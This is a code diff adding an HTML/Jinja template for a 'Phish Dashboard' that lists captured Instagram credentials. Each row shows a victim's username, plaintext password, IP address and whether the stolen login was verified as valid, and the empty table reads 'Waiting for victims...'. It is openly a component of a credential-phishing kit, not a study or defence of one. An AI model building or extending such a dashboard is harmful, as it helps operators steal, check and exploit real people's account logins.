@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Phish Dashboard</title>
+    <style>
+        body { font-family: monospace; background: #121212; color: #fff; padding: 20px; }
+        h1 { color: #E1306C; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { border: 1px solid #333; padding: 10px; text-align: left; }
+        th { background: #2C2C2C; }
+        .success { color: #4CAF50; font-weight: bold; }
+        .fail { color: #F44336; }
+    </style>
+</head>
+<body>
+    <h1>Instagram Pro - Captured Credentials</h1>
+    <p>Total Captured: {{ credentials|length }}</p>
+    <table>
+        <tr>
+            <th>Time</th>
+            <th>Username</th>
+            <th>Password</th>
+            <th>IP Address</th>
+            <th>Verified?</th>
+        </tr>
+        {% for cred in credentials %}
+        <tr>
+            <td>{{ cred.timestamp }}</td>
+            <td><strong>{{ cred.username }}</strong></td>
+            <td>{{ cred.password }}</td>
+            <td>{{ cred.ip_address }}</td>
+            {% if cred.verification_status %}
+            <td class="success">VALID (ID: {{ cred.instagram_user_id }})</td>
+            {% else %}
+            <td class="fail">INVALID/BLOCKED</td>
+            {% endif %}
+        </tr>
+        {% else %}
+        <tr><td colspan="5">No credentials captured yet. Waiting for victims...</td></tr>
+        {% endfor %}
+    </table>
+</body>
+</html>
